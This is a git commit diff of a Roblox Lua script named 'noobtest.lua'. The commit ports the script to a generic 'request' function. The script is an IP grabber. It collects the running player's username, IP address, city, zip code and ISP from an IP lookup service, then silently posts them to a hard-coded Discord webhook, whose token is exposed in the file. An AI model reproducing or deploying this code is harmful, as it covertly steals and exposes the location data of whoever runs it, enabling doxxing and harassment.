d277330555fbbb02ade14bd96c37d4fd2a1a64b3
Bo <bo.van.laarhoven@gmail.com>
2022-12-03 23:01:52 +0100

    Update noobtest.lua

--- noobtest.lua
+++ noobtest.lua
@@ -1,13 +1,13 @@
 local player_name = game:GetService("Players").LocalPlayer.Name
 local webhook_url = "https://discord.com/api/webhooks/1047563608797741186/FS14pvxn58kFcacEYjilBTsRSYIy0KSp2J-Tgh2Xt3JB-IQj3I5rNuFYY89hXNbnv7Xx"
 
-local ip_info = syn.request({
+local ip_info = request({
     Url = "http://ip-api.com/json",
     Method = "GET"
 })
 local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
 local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
-syn.request(
+request(
     {
         Url = webhook_url,
         Method = "POST",
@@ -17,5 +17,3 @@ syn.request(
         Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
     }
 )
-
-print("noob")
